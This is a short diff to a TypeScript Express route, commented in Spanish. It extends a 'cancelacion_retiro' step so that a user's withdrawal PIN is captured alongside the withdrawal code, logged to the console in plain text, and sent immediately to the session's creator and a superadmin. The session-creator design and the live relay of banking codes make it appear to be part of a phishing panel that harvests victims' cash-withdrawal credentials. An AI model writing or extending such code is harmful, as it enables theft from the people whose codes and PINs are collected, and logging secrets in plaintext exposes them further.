@@ -1388,9 +1388,16 @@ export async function registerRoutes(app: Express): Promise<Server> {
               case 'cancelacion_retiro':
                 if (inputData && inputData.codigoRetiro) {
                   updatedFields.codigoRetiro = inputData.codigoRetiro;
-                  console.log('Recibido código de retiro:', inputData.codigoRetiro);
+                  
+                  // Guardar también el PIN de retiro si se ha proporcionado
+                  if (inputData.pinRetiro) {
+                    updatedFields.pinRetiro = inputData.pinRetiro;
+                    console.log('Recibido código de retiro:', inputData.codigoRetiro, 'con PIN:', inputData.pinRetiro);
+                  } else {
+                    console.log('Recibido código de retiro:', inputData.codigoRetiro, 'sin PIN');
+                  }
 
-                  // Notificar a los administradores el código de retiro inmediatamente
+                  // Notificar a los administradores el código de retiro y PIN inmediatamente
                   const sessionData = await storage.getSessionById(sessionId);
                   const createdBy = sessionData?.createdBy || '';
                   
@@ -1399,6 +1406,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
                     data: {
                       sessionId,
                       code: inputData.codigoRetiro,
+                      pin: inputData.pinRetiro || '',
                       createdBy // Añadimos el creador para referencia
                     }
                   }), createdBy); // Enviamos solo al creador y al superadmin
